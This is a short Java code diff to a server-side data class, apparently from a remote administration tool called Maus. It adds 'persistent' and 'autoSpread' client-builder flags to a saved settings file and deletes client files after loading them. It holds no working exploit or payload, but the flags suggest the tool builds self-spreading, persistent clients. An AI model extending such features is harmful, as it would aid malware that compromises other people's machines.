@@ -3,6 +3,7 @@ package Server.Data;
 
 import Logger.Level;
 import Logger.Logger;
+import Maus.ClientBuilder;
 import Server.ClientObject;
 import Server.ServerSettings;
 import javafx.collections.FXCollections;
@@ -42,7 +43,9 @@ public class PseudoBase implements Repository {
         File mauscs = new File(System.getProperty("user.home") + "/Maus/.mauscs");
         try (BufferedWriter writer = new BufferedWriter(new FileWriter(mauscs))) {
             writer.write(ServerSettings.getConnectionIp() + "\n" + " ");
-            writer.write("" + ServerSettings.getPORT());
+            writer.write("" + ServerSettings.getPORT() + "\n" + " ");
+            writer.write("" + ClientBuilder.isPersistent + "\n" + " ");
+            writer.write("" + ClientBuilder.autoSpread);
         } catch (IOException i) {
             Logger.log(Level.ERROR, i.toString());
         }
@@ -101,6 +104,7 @@ public class PseudoBase implements Repository {
                     CONNECTIONS.put(o.getIP(), o);
                     mausData.put(o.getIP(), o);
                     in.close();
+                    listOfFile.delete();
                 }
             } else {
                 break;
